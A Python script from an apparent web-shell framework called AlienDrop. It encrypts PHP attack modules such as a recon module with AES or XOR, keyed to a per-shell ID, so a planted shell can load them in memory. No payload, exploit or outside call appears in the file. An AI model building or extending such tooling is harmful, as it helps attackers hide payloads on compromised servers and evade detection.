#!/usr/bin/env python3
# MINC - encrypt_module.py (AlienDrop Module Encryptor)

import os
import sys
import argparse
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from pathlib import Path

# === CONFIG ===
MODULE_DIR = Path(__file__).resolve().parent.parent / "modules"
SALT = "::alien_salt"
BLOCK_SIZE = AES.block_size


def pad(data):
    pad_len = BLOCK_SIZE - len(data) % BLOCK_SIZE
    return data + bytes([pad_len] * pad_len)


def xor_encrypt(data, key):
    key_bytes = key.encode()
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])


def aes_encrypt(data, key_str):
    key = hashlib.sha256(key_str.encode()).digest()
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(data)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(iv + encrypted)


def process(input_path, shell_id, mode="aes"):
    if not os.path.isfile(input_path):
        print(f"[!] Module not found: {input_path}")
        sys.exit(1)

    with open(input_path, "rb") as f:
        module_data = f.read()

    key = shell_id + SALT
    enc = aes_encrypt(module_data, key) if mode == "aes" else base64.b64encode(xor_encrypt(module_data, key))
    output_path = MODULE_DIR / f"{shell_id}.enc"

    MODULE_DIR.mkdir(parents=True, exist_ok=True)
    with open(output_path, "wb") as out:
        out.write(enc)

    print(f"[+] Encrypted module written to: {output_path}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Encrypt AlienDrop PHP modules for memory loading")
    parser.add_argument("input", help="Path to input PHP module (e.g., modules/recon.php)")
    parser.add_argument("shell_id", help="Shell ID to generate encryption key (e.g., b17f9a)")
    parser.add_argument("--mode", choices=["aes", "xor"], default="aes", help="Encryption mode")
    args = parser.parse_args()

    process(args.input, args.shell_id, args.mode)

